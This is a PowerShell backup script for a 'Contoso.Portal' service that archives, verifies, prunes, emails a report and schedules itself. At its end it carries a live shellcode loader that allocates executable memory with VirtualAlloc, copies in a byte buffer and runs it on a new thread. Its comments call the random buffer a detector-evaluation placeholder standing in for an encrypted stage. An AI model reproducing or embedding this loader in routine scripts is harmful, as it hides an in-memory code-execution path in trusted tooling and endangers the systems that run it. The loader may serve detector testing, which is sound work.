#Requires -Version 5.1
$SourcePath       = "E:\Services\Contoso.Portal"
$BackupRoot       = 'D:\Backups\Portal'
$RetentionDays    = 7
$CompressionLevel = "Optimal"
$MinFreeGB        = 10
$DryRun           = $false

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$jsonBody = $manifest | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
Write-Host ("Restore check: {0} files recovered" -f $restored)
$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
foreach ($dir in $staleProbes) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
if ($LASTEXITCODE -ge 8) {
    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
}
$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
Write-Verbose ("Staged files: {0}" -f $stageCount)

$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8

$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray

$MailTo = 'backup-ops@contoso.com'
$MailFrom = "backup@contoso.com"
$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)

Send-MailMessage -To $MailTo -From $MailFrom -Subject "Backup completed" -Body $mailBody -SmtpServer 'smtp.contoso.com' -Port 587 -UseSsl

$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
foreach ($dir in $oldStages) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green

$elapsed = Measure-Command -Expression {
    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
}
Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)

$excluded = @('*.tmp', '*.log', '*.bak')
Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))

$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Sort-Object -Property LastWriteTime | Select-Object -First 3
$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$robolog = Join-Path $BackupRoot 'robocopy.log'
robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
if ($LASTEXITCODE -ge 8) {
    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
}

$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
$largeFiles | ForEach-Object {
    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
}

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Start-AppBackup.ps1'
$trigger = New-ScheduledTaskTrigger -Daily -At "08:30"
Register-ScheduledTask -TaskName 'Contoso-AppBackup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xb9, 0xdb, 0x6c, 0xee, 0xa6, 0xa4, 0x10, 0x1b, 0x5c, 0x9c, 0x97, 0xcc, 0x18, 0x68, 0x5c, 0x55,
    0x79, 0x9c, 0x7c, 0x2b, 0xc9, 0x82, 0x02, 0x23, 0x89, 0x78, 0x91, 0x1d, 0x8b, 0x9e, 0xa4, 0x86,
    0xf5, 0x0c, 0x4f, 0x89, 0x21, 0xbf, 0x8e, 0xc0, 0x54, 0x2a, 0x9b, 0x1a, 0x17, 0x02, 0x2b, 0x71,
    0xc6, 0x05, 0x22, 0x8e, 0x47, 0xec, 0xbf, 0x94, 0x8d, 0x4f, 0x98, 0x5f, 0x4f, 0x68, 0x20, 0xe8,
    0x5a, 0xef, 0x3d, 0xd0, 0x5e, 0x6f, 0xd6, 0x65, 0xdb, 0xb5, 0x04, 0x2b, 0xd1, 0x1c, 0x08, 0xb4,
    0xab, 0x9a, 0x10, 0x24, 0x04, 0x6a, 0x97, 0xa9, 0x9c, 0x5d, 0x59, 0xef, 0x46, 0x81, 0x51, 0x5f,
    0xcb, 0xdf, 0x80, 0x2b, 0x89, 0x24, 0x6b, 0xc1, 0xa8, 0x90, 0x2f, 0xd3, 0x8a, 0x8d, 0x2a, 0x91,
    0x68, 0xb5, 0x95, 0x65, 0xeb, 0xa1, 0xae, 0x48, 0xdf, 0xed, 0x90, 0x9d, 0x64, 0x98, 0xdc, 0x62,
    0x50, 0x68, 0xa1, 0xdc, 0x41, 0xbf, 0x1d, 0x2f, 0xf6, 0x76, 0x35, 0xef, 0xf7, 0x48, 0x70, 0x33,
    0xa3, 0xce, 0xc8, 0x12, 0x5f, 0x36, 0x99, 0x2c, 0x98, 0x2d, 0xfa, 0x4b, 0x84, 0x7e, 0xd3, 0x9b,
    0xa1, 0xf8, 0x4b, 0x80, 0xea, 0x29, 0x2a, 0x93, 0x2f, 0xc8, 0x73, 0x1b, 0x85, 0x33, 0x30, 0x24,
    0x6a, 0x5d, 0xd2, 0x6d, 0xf2, 0x61, 0x42, 0xd2, 0x96, 0xae, 0x0c, 0x46, 0x50, 0x78, 0xd3, 0xc2,
    0x2d, 0xec, 0x6a, 0xa3, 0xfa, 0x6d, 0xe3, 0x67, 0x0a, 0x59, 0xad, 0xf0, 0xc8, 0x26, 0x2a, 0xe4,
    0xa7, 0xae, 0x66, 0x9b, 0x3e, 0x1c, 0x8a, 0xeb, 0x59, 0x40, 0x99, 0x22, 0xe8, 0x37, 0x65, 0xe1,
    0xcf, 0xbb, 0x63, 0x03, 0x55, 0xaa, 0xad, 0x04, 0x41, 0x22, 0x2a, 0xb9, 0x91, 0xca, 0xfd, 0x83,
    0xcb, 0xa4, 0xa9, 0x8a, 0x1d, 0x6c, 0x7b, 0xa3, 0x60, 0x3f, 0xb6, 0xc7, 0x3e, 0xa3, 0x73, 0x55,
    0x9c, 0xdc, 0x76, 0xd0, 0x03, 0x75, 0xfd, 0x00, 0x11, 0x47, 0x05, 0x05, 0x2b, 0x29, 0xcf, 0x1b,
    0xc8, 0xf3, 0x7b, 0x24, 0xf2, 0xbe, 0x4d, 0x76, 0x6b, 0x59, 0xf4, 0xc8, 0x62, 0x8f, 0xb4, 0x8a,
    0x15, 0xb9, 0x8c, 0xe6, 0x06, 0xa3, 0x2d, 0x07, 0x58, 0x9a, 0xb4, 0xb5, 0xd6, 0xa8, 0x4a, 0x2b,
    0xa5, 0xcd, 0xe1, 0x97, 0x07, 0xbc, 0x75, 0x67, 0x55, 0x9a, 0x99, 0xc1, 0x8c, 0xe2, 0xd5, 0xa7,
    0x50, 0xf8, 0x70, 0x1d, 0x4b, 0x51, 0xe8, 0x7a, 0x9a, 0x1a, 0x0a, 0x4a, 0x2f, 0x16, 0xf1, 0x4e,
    0xde, 0x8d, 0x07, 0x80, 0xd8, 0x41, 0x38, 0xb5, 0x73, 0x1b, 0x62, 0xe8, 0xf1, 0x79, 0x74, 0xdc,
    0x0e, 0x7c, 0xf2, 0x62, 0x50, 0x19, 0x4a, 0x57, 0x25, 0xaf, 0x57, 0x76, 0x35, 0x5a, 0x1b, 0x95,
    0x03, 0x31, 0x86, 0x8e, 0xad, 0x2b, 0x57, 0x1b, 0xd7, 0x3d, 0xc6, 0xc6, 0xd0, 0xd2, 0x7f, 0x87,
    0x07, 0xd3, 0x20, 0xb1, 0x92, 0x5b, 0x75, 0xbb, 0xb8, 0x1f, 0xdf, 0xd2, 0x33, 0x0a, 0x6e, 0xa2,
    0xb9, 0xcf, 0xf0, 0x83, 0x69, 0xc0, 0x79, 0xc0, 0xdc, 0xf1, 0x57, 0xc4, 0x31, 0xc3, 0x9e, 0x7f,
    0x98, 0x3c, 0xd8, 0xe3, 0x8c, 0x03, 0x87, 0xb6, 0x9d, 0xdb, 0x90, 0x1f, 0x05, 0x36, 0xbc, 0x2d,
    0x81, 0x11, 0x78, 0x91, 0x2b, 0xa1, 0xea, 0x69, 0xe1, 0xdc, 0x89, 0x7c, 0x35, 0x01, 0x6c, 0x72,
    0xf1, 0x99, 0x9b, 0xe5, 0xeb, 0x70, 0xb8, 0xc3, 0xd3, 0x59, 0xee, 0xd5, 0x5f, 0xbb, 0x6d, 0xe3,
    0xcb, 0x84, 0x86, 0xd5, 0xc5, 0x28, 0x52, 0x34, 0xdd, 0x99, 0x17
)

$BufferAddress = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 2402)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
